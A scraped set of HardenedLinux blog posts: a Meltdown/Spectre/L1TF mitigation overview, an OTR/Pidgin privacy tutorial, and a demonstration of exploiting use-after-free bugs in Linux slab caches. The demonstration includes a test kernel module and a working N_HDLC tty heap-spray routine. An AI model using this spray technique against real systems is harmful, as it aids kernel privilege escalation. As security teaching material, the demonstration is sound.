# [Nightmares( Meltdown/Spectre/L1TF) never goes away](https://hardenedlinux.org/blog/2018-08-16-nightmares-meltdown/spectre/l1tf-never-goes-away/)


              Aug
              16

---

# SGX

`https://hardenedlinux.org/tags/sgx`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2018


# [Nightmares( Meltdown/Spectre/L1TF) never goes away](https://hardenedlinux.org/blog/2018-08-16-nightmares-meltdown/spectre/l1tf-never-goes-away/)


              Aug
              16

---

# OTRv3

`https://hardenedlinux.org/tags/otrv3`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2018


# [Federated XMPP with OTR (Off-the-record v3) to protect privacy for Linux user](https://hardenedlinux.org/blog/2018-02-09-federated-xmpp-with-otr-off-the-record-v3-to-protect-privacy-for-linux-user/)


              Feb
              9

---

# XMPP

`https://hardenedlinux.org/tags/xmpp`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2018


# [Federated XMPP with OTR (Off-the-record v3) to protect privacy for Linux user](https://hardenedlinux.org/blog/2018-02-09-federated-xmpp-with-otr-off-the-record-v3-to-protect-privacy-for-linux-user/)


              Feb
              9


## 2017


# [Security Promotion - Mandatory TLS Connection for XMPP](https://hardenedlinux.org/blog/2017-05-26-security-promotion-mandatory-tls-connection-for-xmpp/)


              May
              26

---

# Demo for exploiting use-after-free in dedicated cache

`https://hardenedlinux.org/blog/2019-02-20-demo-for-exploiting-use-after-free-in-dedicated-cache`

# HardenedLinux

We may need to make the target object in free slabs

# Exploit use-after-free bugs in dedicated cache


This is just a demonstration.


![demo](https://hardenedlinux.org/images/use-after-free_in_dedicated_cache.gif)


### HOWTO


- free the target object
- spray and eat all available memory, take high memory usage, hope to have the freed object poisoned
- trigger the use-after-free


### NOTICE


> For each cache, the Slab allocator keeps three doubly-linked lists of slabs:
>
>
>
>
> - full slabs: all objects of a slab are used (i.e. allocated)
> - free slabs: all objects of a slab are free (i.e. the slab is empty)
> - partial slabs: some objects of the slab are used and other are free


**We may need to make the target object in `free slabs`**


### Refs


- [https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html](https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html)


### Files


- kernmod.c


```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/debugfs.h>
#include <linux/kallsyms.h>
#include <linux/delay.h>
#include <asm/insn.h>

#define TARGET_SLABSZ	1920
#define	OBJ_MAX		0x200
#define POISON_VALUE	0x4141414141414141
char *ptrs[OBJ_MAX];
struct kmem_cache *s;

static int __init test_init(void)
{
	long i;

	s = kmem_cache_create("test_memory_poison", TARGET_SLABSZ, 0,
				SLAB_HWCACHE_ALIGN, NULL);
	if (!s)
		return -1;
	for (i = 0; i < OBJ_MAX; i++) {
		ptrs[i] = kmem_cache_alloc(s, GFP_KERNEL);
		if (!ptrs[i])
			break;
		memset(ptrs[i], 'a', TARGET_SLABSZ);
	}

	for (i = 1; i < OBJ_MAX; i++)
		if (ptrs[i])
			kmem_cache_free(s, ptrs[i]);

	pr_info("ptrs[0]: %p\n", ptrs[0]);
	while (1) {
		int found = 0;
		for (i = 1; i < OBJ_MAX; i++) {
			unsigned long val;
			if (!ptrs[i])
				continue;
			val = *(unsigned long *)(ptrs[i] + 0x10);
			if (val == POISON_VALUE) {
				found = 1;
				break;
			}
		}

		if (found) {
			for (i = 1; i < OBJ_MAX; i++) {
				if (!ptrs[i])
					continue;
				if (*(unsigned long *)(ptrs[i] + 0x10) ==
						POISON_VALUE)
					pr_info("ptrs[%ld]: %p poisoned\n",
							i, ptrs[i]);
			}
			break;
		}

		msleep(1000);
	}

	kmem_cache_free(s, ptrs[0]);
	return 0;
}

static void __exit test_exit(void)
{
	kmem_cache_destroy(s);
	return;
}

module_init(test_init);
module_exit(test_exit);
MODULE_LICENSE("GPL");
```


- kern_mem_poison.c


```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <ctype.h>

static unsigned long mem_avail = 0;
static int get_memory_avail(void)
{
	int fd = open("/proc/meminfo", O_RDONLY);
	if (fd == -1) {
		return -1;
	}

	char buf[4096];
	memset(buf, 0, 4096);
	int err = read(fd, buf, 4096);
	if (err == -1) {
		close(fd);
		return -1;
	}

	char *string = "MemAvailable:";
	char *p = strstr(buf, string);
	if (!p) {
		close(fd);
		return -1;
	}

	p += strlen(string);
	while (isspace(*p))
		p++;

	mem_avail = 1024 * atoll(p);
	return 0;
}

static int open_n_hdlc(void)
{
	int fd = open("/dev/ptmx", O_RDWR | O_NONBLOCK);
	if (fd == -1) {
		return -1;
	}

	int cmd = TIOCSETD;
	int arg = N_HDLC;
	int err = ioctl(fd, cmd, &arg);
	if (err == -1) {
		close(fd);
		return -1;
	}

	err = ioctl(fd, TCXONC, TCOOFF);
	if (err == -1) {
		close(fd);
		return -1;
	}

	return fd;
}

static int max_open_files(struct rlimit *rlim)
{
	int err;
	memset(rlim, 0, sizeof(*rlim));
	err = getrlimit(RLIMIT_NOFILE, rlim);
	if (err == -1) {
		return -1;
	}
	rlim->rlim_cur = rlim->rlim_max & (~0xff);
	err = setrlimit(RLIMIT_NOFILE, rlim);
	if (err == -1) {
		return -1;
	}
	return 0;
}

static int kern_mem_poison(char *buf, size_t len)
{
	int err;

	if ((len < 4096) || (len > 65536)) {
		return -1;
	}

	struct rlimit rlim;
	err = max_open_files(&rlim);
	if (err == -1) {
		return -1;
	}

	int fd[rlim.rlim_cur];
	long i;
	for (i = 0; i < rlim.rlim_cur; i++) {
		if (!get_memory_avail())
			if (mem_avail < (len*2))
				break;
		fd[i] = open_n_hdlc();
		if (fd[i] == -1) {
			break;
		}

		err = write(fd[i], buf, len);
		if (err == -1) {
			break;
		}
	}

	if (i < rlim.rlim_cur)
		for (long j = i; j < rlim.rlim_cur; j++)
			fd[j] = -1;

	for (i = 0; i < rlim.rlim_cur; i++) {
		close(fd[i]);
		fd[i] = -1;
	}

	return 0;
}

#define	POISON_VALUE 0x4141414141414141
int main(int argc, char *argv[])
{
	char buf[4096];
	unsigned long *addr = buf;
	for (int i = 0; i < 4096 / 8; i++) {
		addr[i] = POISON_VALUE;
	}
	kern_mem_poison(buf, 4096);
	return 0;
}
```

---

# Nightmares( Meltdown/Spectre/L1TF) never goes away

`https://hardenedlinux.org/blog/2018-08-16-nightmares-meltdown/spectre/l1tf-never-goes-away`

# HardenedLinux

Google project zero’s write-up explains how the vulnerablities( meltdown, spectre v1/v2) work. More info about v3a and v4, check Google project zero’s bug tracker and INTEL-SA-00115.

by Shawn C[ a.k.a “citypw”]


## Meltdown/Spectre


Google project zero’s [write-up](https://googleprojectzero.blogspot.com/2018/01/reading-privileged-memory-with-side.html) explains how the vulnerablities( meltdown, spectre v1/v2) work. More info about v3a and v4, check Google project zero’s [bug tracker](https://bugs.chromium.org/p/project-zero/issues/detail?id=1528) and [INTEL-SA-00115](https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00115.html).


| Vulnerablity | Affect | Kernel mitigation | Compiler support |
| --- | --- | --- | --- |
| v3 Meltdown( rogue data cache load (CVE-2017-5754)) | < IceLake( 2018/2019) | KPTI/ [PAX_UDEREF](https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/grsec-code-analysis/PAX_MEMORY_UDEREF.md) | N/A |
| Spectre v1( bounds check bypass (CVE-2017-5753)) | < IceLake( 2018/2019) | [Code hardening](https://lwn.net/Articles/746551/) | N/A |
| [Spectre v1.1](https://people.csail.mit.edu/vlk/spectre11.pdf) ( Bounds check bypass on stores( CVE-2018-3693)) | < IceLake( 2018/2019) | ? | N/A |
| [Spectre v1.2](https://people.csail.mit.edu/vlk/spectre11.pdf) ( Read-only protection bypass) | < IceLake( 2018/2019) | ? | N/A |
| Spectre v2( branch target injection (CVE-2017-5715)) | < IceLake( 2018/2019) | RETPOLINE/ [IBPB+IBRS](https://newsroom.intel.com/wp-content/uploads/sites/11/2018/01/Intel-Analysis-of-Speculative-Execution-Side-Channels.pdf) | >= [GCC 7.3](https://gcc.gnu.org/ml/gcc/2018-01/msg00197.html), older version backport needed |
| [v3a](https://www.us-cert.gov/ncas/alerts/TA18-141A) ( CVE-2018-3640 – Rogue System Register Read (RSRE) | < IceLake( 2018/2019 | ? | ? |
| [Spectre v4](https://blogs.technet.microsoft.com/srd/2018/05/21/analysis-and-mitigation-of-speculative-store-bypass-cve-2018-3639/) CVE-2018-3639 – Speculative Store Bypass (SSB) | < IceLake( 2018/2019 | microcode for now | ? |
| [Lazy FP state restore](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-3665) CVE-2018-3665 | < IceLake( 2018/2019 | microcode for now | ? |
| [L1TF](https://software.intel.com/security-software-guidance/software-guidance/l1-terminal-fault) ( [CVE-2018-3615, CVE-2018-3620,CVE-2018-3646/INTEL-SA-00161](https://software.intel.com/security-software-guidance/insights/deep-dive-intel-analysis-l1-terminal-fault)) | < IceLake( 2018/2019) | ? | N/A |


Check the CPU status at runtime:


- /sys/devices/system/cpu/vulnerabilities/meltdown
- /sys/devices/system/cpu/vulnerabilities/spectre_v1
- /sys/devices/system/cpu/vulnerabilities/spectre_v2
- /sys/devices/system/cpu/vulnerabilities/spec_store_bypass
- /sys/devices/system/cpu/vulnerabilities/l1tf


## Kernel maintainence assessment( Meltdown/Spectre v1/v2)


| Kernel | Difficulty level to fix | Description | Support version? |
| --- | --- | --- | --- |
| PaX/Grsecurity | Nightmare | Multiple features( out-of-tree mostly) must be adapted | 3.14 – 4.14 |
| GCP/AWS/Azures | Hardcore | Multiple features? | 2.6.x – ? |
| GNU/Linux distro | Hurt Me Plenty | Closer to the upstream except RHEL/Centos | 3.10 – 4.14 |
| Alibaba | Bring It On | A few non-security features must be adapted | 2.6.x – 4.4 |
| Tencent | I Can Win | Pretty much the same as CentOS | 2.6.x – 3.x? |


- PaX/Grsecurity, the current features( USERCOPY/KERNEXEC/UDEREF/RAP/RANDSTRUCT/etc) need a lot of modifications to fit with the changes for the fixes from spectre v1/v2( RETPOLINE?) and especially the KPTI infrastruture. Only a few maintainers can do the job, which is so obviously.
- [GCP](https://cloud.google.com/security/cpu-vulnerabilities/), GCP has done the good job about the whole process( risk assessment, research/dev about RETPOLINE and the deployment) for their customers. It’s a heavy workload for GCP/AWS/Azures maintainers due to ( highly customized?) linux kernel and the changes from KPTI infrastructure.
- The major GNU/Linux distro fixed Meltdown by backporting the KPTI. RHEL is [temporarily stopped provide the packages](https://access.redhat.com/solutions/3315431) of CPU microcode update( IBRS?) which supposed to address [Spectre](https://access.redhat.com/security/vulnerabilities/speculativeexecution) v2 but it causes the boot issues.
- The maintainers from Alibaba/Tencent doesn’t worry too much about the backport work. Alibaba had customized kernel in some old kernel trees( 2.6.x) but their current maintainence kernel is v4.4( Dec 2017) based due to policy changed to make their production kernel closer to the mainline. Tencent( TLinux)’s linux kernel is pretty much the same as the distro kernel( CentOS).


## Situational hardening vs. OpsDEV


| Defense solution | Security | Deployment level | Performance hit | Description |
| --- | --- | --- | --- | --- |
| TSX/page fault detector | Low | Easy | None | Regular attack surfaces on Meltdown |
| KPTI/RETPOLINE | Medium | Hard | High? | Meltdown, Spectre v2 |
| PaX/Grsecurity( 2018 version) | High | Easy | High? | Meltdown, Spectre v1/v2 |


The hardware’s debts paid by the software now. Meltdown/Spectre are CPU design flaws that hard to be fixed for the current hardware( until Icelake?). The current proposal solution will cause the performance hits, e.g: KPTI could be the serious performance impact in heavily I/O operations. Some customers doesn’t even plan to fix Meltdown via KPTI because the performance hits, while others doesn’t have the proper technical/risk assessment. IMOHO, Meltdown/Spectre doesn’t have the general solution. I’m not going to discuss those Spectre variants which only can be resolved by microcode. Let’s try to figure out the possible solution for the different requirement.


- Low-cost( low security & easy to deployment): According to the public exploits, Meltdown seems more danger than Spectre. So this proposal hardening solution won’t contain the mitigation for Spectre. If security critiria is only prevent the massive exploitation w/o any performance hits, you may not need KAISER/KPTI. Be careful if you are intend to deploy page fault detector only. Seriously? Well, you can’t solve Meltdown and Spectre variants at low cost.
- Standard solution( medium security & hard to deployment): KPTI( Linux mainline’s solution merged in v4.15 and it’s backport to v4.14) should be used for mitigate the Meltdown. [RETPOLINE](https://security.googleblog.com/2018/01/more-details-about-mitigations-for-cpu_4.html) is a performance-oriented solution and it benefits the pre-Skylake machines. But it increases the [burden of software deployment](https://cyber.wtf/2018/02/13/in-debt-to-retpoline/) since the retpoline needs the re-compile the software for the new CPU. RETPOLINE is added to be support since GCC 7.3 and it may be backport to GCC 6.x. RETPOLINE is the best option since IBRS/IBPB microcode is not ready for now( Feb 16 2018). Most GNU/Linux distro( Debian/SuSE/RedHat/etc) and cloud vendors( including GCP/AWS/Azures) will choose this path.
- Best trade-off solution( high security & easy to deployment): PaX’s UDEREF is the best one for both security and performance. This feature was designed by PaX team to kill [ret2usr attack](https://github.com/hardenedlinux/grsecurity-101-tutorials/blob/master/kernel_mitigation.md#ret2usr-protection) in the 1st place but it brings more layers of defense even better than hardware implementation( e.g: SMAP on >= Broadwell). SMAP-enhanced PaX’s UDEREF made the performance improvement since [PaX/Grsecurity v4.12](https://grsecurity.net/grsecurity_4_12_updates.php). PaX’s UDEREF implemented the per-cpu pgd back in 2013, which make it easy to implement the full kernel page isolation. The SMAP-enhanced UDREF fixed Meltdown in v4.14.13 and the performance is better than KPTI, while it also provide more security features…


## L1TF


L1TF is a new beast can perform side channel attack in Intel CPU by triggering unmapped memory resulted in a terminal fault where is L1TF comes into play. L1TF affects multiple levels of system software, including OS, SMM, Hypervisor/VMM and SGX:


| Vulnerablity | Impact | Description |
| --- | --- | --- |
| CVE-2018-3646 | VMM | malicious guest OS is able to gain the data( shared L1D) from other guest OS or VMM itself |
| CVE-2018-3620 | OS/SMM | malicious user is able to gain the priviledge user’s data or priviledged user is able to gain the data from SMRAM |
| CVE-2018-3615 | SGX | Enclave is able to launch the attack to the other enclaves |


The current mitigation is a new MSR( IA32_FLUSH_CMD, 0x10B) introduced by Intel. OS/SMM/VMM/SGX can utilize it to flush L1 cache only at runtime which avoid the performance hit. Btw, cloud vendors can isolate the vCORE for each VM by utilizing the CPU affinity. It seems only [GCP has done it](https://cloud.google.com/blog/products/gcp/protecting-against-the-new-l1tf-speculative-vulnerabilities) before the full disclosure according to the public info. [AWS](https://aws.amazon.com/cn/security/security-bulletins/AWS-2018-019/) provides [dedicated instance](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/dedicated-instance.html) and plz noted that the default policy is shared hardware.


## Defensive side in cy..b.errr..


The core infrastructures( SMM( part of firmware), SGX( supported by microcode, BIOS/UEFI firmware and Intel ME), OS and hypervisor) paid the price for CPU bugs. It’s also a challenge for the operations at data center. How many Spectre variants do we have for now? 7? Ok, the magic number will continue to grow as always. It’s been tough for those security engineering/consultant work w/ data center to deal w/ side channel vulnerablities in past years. Risk assessment, vulnerablity anaylsis, patch review, regression testing for important applications, upgrade failures and other bunch of work to deal w/ both ppl and technical issues. Assuming that the security experts can [tune the system](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/plain/Documentation/admin-guide/l1tf.rst) ( e.g: L1TF) well but we’re likely to go through the whole process again( and again in the future?). What if firmware upgrade failures in an old enough machine doesn’t compliant w/ [NIST SP-193](https://csrc.nist.gov/publications/detail/sp/800-193/final)? Oh, you can re-flash it by SPI programmer manually but how about hundre thousands of machines error occurs. The majority of security industry may not like to develop the mitigation/prevention( it’s hard, I know!). Tons of money spent on a bunch of fancy “fastfood” shows in some vendorcons each year only make things worse. Do we still remember those [Intel ME vulnerablities](https://github.com/hardenedlinux/firmware-anatomy/blob/master/hack_ME/me_info.md) not long ago? Intel runs MINIX3-based OS on an old good independent x86 CPU since Skylake( 2015) and it seems doesn’t even have the basic mitigation which exists already in 90s. How about the old bug from [TXT/TPM](https://www.ssi.gouv.fr/uploads/IMG/pdf/Cansec_final.pdf) ( really neat one)? How many of us are willing to implement some promising “cloud” security features( Remote attestation?) based on TXT/TPMv2 w/ hardened the known attack surfaces by default? Well, not everything should be moved into the enclave. L1TF’s vairant E2E doesn’t make SGX look as Intel promised, see? I personally love enclave-based solution and I kind of like the SGX( except it’s not open source and can’t be audited properly) but why the hell everyone want to treat SGX like a silver bullet to sovle all security issues? Because of DLT ppl( did I say blockchain? fuck blockchain…) are so rush to solve their trustworthy issue? Well, we may still need to try harder to hardening the COREs. Let’s make the COREs hardened!( again?)


## Tools


- [Spectre & Meltdown vulnerability/mitigation checker for Linux](https://github.com/speed47/spectre-meltdown-checker)

---

# Federated XMPP with OTR (Off-the-record v3) to protect privacy for Linux user

`https://hardenedlinux.org/blog/2018-02-09-federated-xmpp-with-otr-off-the-record-v3-to-protect-privacy-for-linux-user`

# HardenedLinux

To implement DH, OTR makes use of a certain modular multiplicative group whose modulo is the 1536-bits prime defined in RFC 3526, with its primitive root 2 selected as the generator, to ease calculation.

![XMPP](https://hardenedlinux.org/images/XMPP.png)


## Principle of OTR protocol


### Diffie–Hellman (DH) key exchange


Diffie–Hellman key exchange is performed between integers and a finite cyclic group. Started here, integers are represented with lowercase letters, while elements of the cyclic group are represented with uppercase letters, and “==” is used to represent mathematical identity.


#### Character of finite cyclic groups


The number of the elements of a finite cyclic group is finite (as its name), and is called the order of the group.


The basic group operation P is commutative and associative: P(A,B)==P(B,A), P(P(A,B),C)==P(A,P(B,C)).


There is an identity element E in the group, with an arbitrary element A, satisfying P(A,E)=A, and there for each element A exists only one inverse element (-A) making P(A,-A)=E. The inverse element of identity element E is itself.


Applying m times operation P to the same element A is defined as a new operation M(m,A), with additional definition M(-m,A)=-M(m,A), thus according to these definitions, P(M(x,A),M(y,A))==M(x+y,A), and M(0,A)=E.


There are generators G (usually more than one) different with the identity element, making M(n,G)=E, and it can be proved that M(0,G)=E, M(1,G), M(2,G)……M(n-1,G) make up all the elements of the group.


For an arbitrary element, and arbitrary integers x, y, it can be proved that M(y,M(x,A))==M(x,M(y,A))==M(xy,A), which is the basis of DH.


The finite cyclic groups practical for cryptography need to satisfy that it is easy to compute M(m,A) from given m and A, but hard to compute an m satisfying M(m,A)=B from given A and B (usually called the discrete logarithm problem of such finite cyclic group).


Groups commonly used for cryptography include **multiplicative group of integers modulo prime p** (in which P is the modular multiplication, M is the modular exponentiation) and **additive group of points on an elliptic curve over finite fields** (in which P is the modular addition of points, M is the modular multiplication between of a point and an integer).


#### Key Exchanging procedure


Started here, A=M(a,G) is called the (mapped) image within the cyclic group about its generator G of integer a, and a is the preimage of A.


1. Alice and Bob agree to use a finite cyclic groups practical for cryptography and one of its generator G.
2. Alice and Bob respectively choose their secret integer a and b randomly, compute corresponding image A=M(a,G) and B=M(b,G), then send the image to the other part.
3. Alice and Bob respectively compute the shared secret from their own preimage and the image sent from the other part: S=M(a,B)=M(a,M(b,G))==M(ab,G)==M(b,M(a,G))=M(b,A).


Now they get the same shared secret, and they can derive the session key for symmetric encryption via the same algorithm.


Note that only the information about the group itself, and images A and B, appear on the communication channel, but it is very hard to get a preimage from its image within a finite cyclic groups practical for cryptography, thus the security is kept.


### Cryptographic hash algorithm


This kind of algorithms accept an input with arbitrary length, to generate an output with fixed-length, by scrambling, mixing, and recombining the input, and it is very hard to speculate the input from its output. They are usually designed so that a tiny change of the input causes a vast change of the output, but they are definite, via which outputs generated from identical inputs are surely identical.


### Assymmetric signature algorithm


DH key-exchanging itself is not resistant man-in-the-middle attack, that is to say, you cannot be sure that the image you receive is indeed sent from the part with which you intend to communicate. The regular method to resolve such problem is usually to use assymmetric signature algorithms.


Assymmetric signature algorithms make use of public-private key pairs, and it is very hard to speculate private keys from public keys. The private key is strictly kept secret, with only its holder knowing, while the public key could be sent to anyone who wants to communicate with you.


A hash algorithm is applied upon a piece of data, and the result is processed with the private key. The final result is the digital signature of the original data, generated with the private key. Anyone with the data and signature at hand could ensure via hash algorithm and public key that:


1. The data are not changed.
2. The signature are undeniably generated with the corresponding private key.


### symmetric encryption algorithm


A secret key is applied to a piece of plain text to generate cipher text (with the same length with the plain text, usually), and plain text could be easily and perfectly restored with an identical secret key, but be very hard for parts with the secret key unknown. A good symmetric encryption algorithm is usually designed so that a tiny change of the input causes a vast change of the output, too.


### Message authentication code/algorithm (MAC)


Message authentication algorithms are someway similar to digital signature algorithms, but they work symmetrically: Applying the authentication key to an arbitrary piece of data results the corresponding message authentication code with fixed-length, but it is very hard either to speculate the original data and authentication key from MAC, or to speculate the authentication key from MAC and original data. Thus, only those parts with the authentication key at hand are capable to check the integrity of the data, but in contrast with digital signature, every part holding the authentication key is capable to generate the identical MAC, thus MAC cannot be used for authentication.


Message authentication algorithms are commonly designed upon symmetric encryption and/or cryptographic hash algorithms, and those derived from hash algorithms are called HMAC.


## Brief introduction of OTR


Off-the-Record Messaging (abbreviated to OTR) is a security protocol capable to work on the basis of arbitrary protocol which can reliably transfer texts bidirectionally. It provides these peatures below:


1. Perfect forward secrecy: Adversaries are unable to restore the conversation even they have monitored the whole conversation and/or fetched the long-term keys stored on endpoints.
2. Unity of integrity and deniability: You can confidentially ensure whether a message is sent by the other end; while adversaries in between cannot testify who have certainly said what.


To implement DH, OTR makes use of a certain **modular multiplicative group** [whose modulo is the 1536-bits prime defined in RFC 3526, with its primitive root 2 selected as the generator, to ease calculation](https://tools.ietf.org/html/rfc3526#page-3).


Identity authentication is required because DH key exchanging itself is not resistant to man-in-the-middle attack. The latest version of OTR makes use of DSA algorithm to make digital signature for authentication.


However, authentication based on digital signature is undeniable, thus the traditional ways (e.g. current TLS) to plainly send public keys before sending signed mapped images leak identities (public keys) to the potential adversary in between.


In order to unite the integrity and deniability, OTR in **handshaking** phase utilizes a way to `"do an unauthenticated Diffie-Hellman (D-H) key exchange first, and then mutually authenticate identities, images and values derived from the shared secret inside the symmetrically encrypted channel derived from the shared secret"`. As the authentication process itself is encrypted, identities are not leaked to a passive sniffer; although public keys could be swindled out via man-in-the-middle attack, however, because mapped images and values derived from the shared secret are authenticated as well, and the man-in-the-middle is nearly impossible to get identical shared secrets with two endpoints via agreement, man-in-the-middle attack nearly always breaks authentication. Therefore a succeeded OTR handshaking guarantees that conversation participants can obtain public keys of the other part during handshaking, and only they can, thus unite the integrity and deniability – handshaking is undeniable only to its participants.


OTR utilizes AES for symmetric encryption, and HMAC-SHA256 for message authentication.


After handshaking succeeded, the two parts have their own preimage and image sent from the other, from which identical shared secrets could be computed respectively.


The way for OTR to implement perfect forward secrecy is extremely paranoid.


- With their preimage and the other’s image, the sender computes the shared secret, from which the encryption key is derived, from which the authentication key is derived. They encrypt the message with encryption key, randomly select a new DH preimage to replace the current and compute its image, then send the other part the combination of `images' serial number of the two, new image of theirselves' side, cipher text, etc`, with MAC generated with the authentication key for the above-mentioned stuffs attached, and finally update the image’s serial number of theirselves’ side.
- After receiving the message, with their preimage and the other’s image, the receiver computes the shared secret, derives encryption and authentication keys as well, verify the integrity of the message with the authentication key, decrypt the cipher text with the encryption key, and finally update the cached image from the other as well as both serial numbers. It can be seen that the DH parameters (the preimage and the corresponding image) of one side is updated during sending, and if one side only receives but does not send messages in a period of time, their DH parameters remain unchanged.


It is clear that OTR performs DH exchanging for the next message every time when sending a message, thus every message is encrypted with different encryption key, to approach the security level of `one-time pad`.


In order to unite the integrity and deniability here, every authentication key of received messages since last sending is collected and sent **plainly** attaching to the new message. Its designated target is not the other part, but any potential adversary. Anyone obtained the authentication key can make messages capable to pass authentication, and libotr – the major implementation of OTR even provides specialized tools for that. Therefore, adversaries cannot testify a certain message is sent by a certain person and spied by them, but not forged by themselves, thus the deniability is achieved. However, before published via new message, only the sender and receiver can get the the authentication key by deriving from the shared secret, thus the receiver of the message can ensure the message is indeed sent by the other part, thus the integrity is achieved.


To learn OTR’s further detail, [its official document](https://otr.cypherpunks.ca/Protocol-v3-4.1.1.html) can be referred to.


*To learn OTR’s further detail, 
its official document can be referred to.*

## Using OTR protocol


Until now, only XMPP protocol implements the integration of OTR in its mainstream clients, and in the next place, small amount of IRC clients integrate OTR. However as mentioned above, in theory atop any protocol capable to reliably transfer texts bidirectionally, OTR can work. That is why I suggest here to use [Pidgin](https://pidgin.im/), an instant messaging client supporting plenty of features of plenty of protocols via its plugin system – via pidgin, you can even use OTR to protect yourselves atop proprietary protocols, e.g. MSN.


### Brief introduction of Pidgin


The core of Pidgin is a library abstracting an instant messaging client, called libpurple, which contains no concrete implementation of user interface and/or communication protocol, but leaves them to application programs and protocol plugins to complete. In architectural sense, Pidgin, written with GTK+, is the official user interface of libpurple; while the OTR plugin acts as the middleware between libotr, libpurple and Pidgin, unrelated to concrete communication protocol. Therefore, via pidgin, you can use OTR atop any protocol with implementation in the form of a protocol plugin of libpurple.


#### Software Installation


In the software repository of Debian and Ubuntu GNU/Linux, common xmpp supports are bundled with libpurple to distribute, and a lot of plugins related to user interface are bundled with Pidgin, while the middleware pidgin-otr is an solitory package.


Install pidgin and the otr plugin with the following commands, respectively.


```
# apt-get install pidgin
# apt-get install pidgin-otr
```


Apt package manager automatically resolves dependencies and installs other required packages。


#### Building a helper plugin: pidgin-xmpp-receipts


There is a problem in OTR: network instability may make the preimage held by one side inconsistent with the mapped image held by the other side, in which case a message sent will be unable to decrypt correctly, but OTR protocol usually cannot automatically recovery synchronization, and requires manually re-handshaking (usually represented as “refresh conversation” on user interfaces).


An extension of XMPP – receipt functionality is helpful to detect the synchronization loss problem of OTR: This extension could deliver a “receipt” defined within the protocol to the sender of a message to notice that the message is received successfully, while cooperated with OTR, “successful receiving” will contain “successful decryption” – only a successfully decrypted message generates its receipt. According to this, sender could detect synchronization losses, and perform re-handshaking in time.


Most dedicated XMPP client natively support the receipt functionality, but in Pidgin’s system, its XMPP protocol plugin does not implement this functionality, therefore [a plugin](https://app.assembla.com/spaces/pidgin-xmpp-receipts/git/source) is written to implement it.


This plugin has not been included in debian as well as its downstream derivatives (though several distributions have included it), so it should be built and deployed manually before it is included by your distribution.


Install the development package of Pidgin:


```
# apt-get install pidgin-dev
```


Clone the source code of the plugin, build and deploy it:


```
$ git clone https://git.assembla.com/pidgin-xmpp-receipts.git
$ cd path/to/pidgin-xmpp-receipts
$ make && make install
```


The resulted plugin `xmpp-receipts.so` is copied to the plugin directory of the current user `${HOME}/.purple/plugins/`, and it can be found in the `Plugins` dialog under the `Tools` menu of Pidgin after restart, with `XMPP Receipts` as its name. After enabled with a check, a tick `✓` will be inserted after a message successfully received by the other end as a mark.


#### Authenticating the identity of the opposite side


You can obtain the public key of the opposite side during handshaking of OTR, to authenticate their identity. If the received public key has never been seen by your client used by the opposite side’s account, the system will give a notification, and save its fingerprint locally, becoming a **recognized but unauthenticated** key.


It is clear that an entity holding a private key corresponding to a **recognized but unauthenticated** public key has once performed OTR handshaking with you, but you are unable, however, to know with it whether who holds the private key corresponding to the public key is identical to the true sender of the message you received, and the verification of this should be done outside the channel authenticated by the key to verify.


The most basi way is to perform **manual verification of fingerprint**: the program shows the fingerprint of public keys of yours and the opposite side. Ensuring that the **fingerprint of the opposite side** in your aspect is identical to the **fingerprint of yourself’s** in the aspect of the opposite side, and the **fingerprint of yourself’s** in your aspect is identical to the **fingerprint of the opposite side** in the aspect of the opposite side is to complete the authentication of the identity of the opposite side, and the public key of the opposite side could be marked as **verified**.


If your peer has more than one public keys, but only a part of them has been verified by you, or you detect a new public key was sent during handshaking from an entity you have verified, you can ask the opposite side to send you their fingerprint with (the instance in which resides) a public key you have verified. For example:


```
"It seems that I have not recognized the OTR fingerprint you just use today. Is it convenient to do a verification? Could you send me the fingerprint you are using with the computer/mobile phone you used the last time we met?"
```


The effect is identical to their giving the fingerprint to you in their presence, as long as your opposite side does never hand over the private key corresponding to the public key you verified to others. After that, you can open the public key fingerprint list in the config dialog of OTR plugin, and mark the verified public key.


If you have verified the OpenPGP public key of your opposite side, you can ask them to sign their OTR fingerprints with their OpenPGP private key and send the result to you, as long as you are confident that they will never hand over their OpenPGP private key.


It should be noted that you should never tell your opposite side the complete fingerprint you want to verify, but let your opposite side tell you the fingerprint, in order for you to confirm.


As the aspect to be authenticated, the two methods above could be combined into one: prepare a list of fingerprints of all the OTR public keys you use, clear-signed with OpenPGP, and send it to your trustful friends, in order for them to verify.


The template below could be referred to:


```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

I hereby claim:

  * I am bob, who owns the following PGP key(s):

	6B25C1C7 7E739D1B 6C5E86B0 D3CED892 A6AEB68B

  * At the same time, I am the owner of the following OTR key(s):

	3340D56D 2C750734 F9869A1B 26CFAC08 04823F52
	1063A0B9 F9EE4D3B 06250142 2A720531 DD2D0DC4

  * The following OTR key(s) are used for mobile phone,
    they may get revoked at any time.

	49AF52C4 53FF6323 635728B6 9325628C 0FF2E547

  * And I declare revocation of the following OTR key(s), their
    private keys are destroyed, please don't trust them:

	8DF79391 B8082682 42D5483E 976503B8 E458AEA8

  * To prove the claims above, this message is signed by my PGP key
    mentioned above.

You could also collect all fingerprints linked to your frequently
used xmpp accounts into a list like this, clear-sign it with gnupg,
and send it to your trustful friends, in order for them to trust you.
-----BEGIN PGP SIGNATURE-----

(signature of your OpenPGP key)
-----END PGP SIGNATURE-----
```


